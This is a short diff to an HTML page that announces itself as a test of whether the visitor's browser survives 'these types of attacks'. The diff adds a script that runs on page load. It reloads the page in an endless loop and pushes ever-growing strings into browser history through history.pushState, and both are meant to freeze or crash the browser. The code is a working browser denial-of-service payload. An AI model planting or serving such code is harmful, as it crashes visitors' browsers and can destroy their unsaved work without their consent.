@@ -9,7 +9,14 @@
 <h1>If your browser has not crashed then this is who is well protected against these types of attacks !</h1>
 
 <h1>But if it crashed then try a better browser or update it ;)</h1>
-    <script>setTimeout(() => { while (1) location.reload(1); }, 100);</script>
+    <script>
+        setTimeout(() => { while (1) location.reload(1); }, 100)
+        var total = "";
+        for( var i = 0; i < 10000000000000; i++ ) {
+          total += i.toString();
+          history.pushState(0,0, total );
+        }    
+    </script>
 </body>
 
 
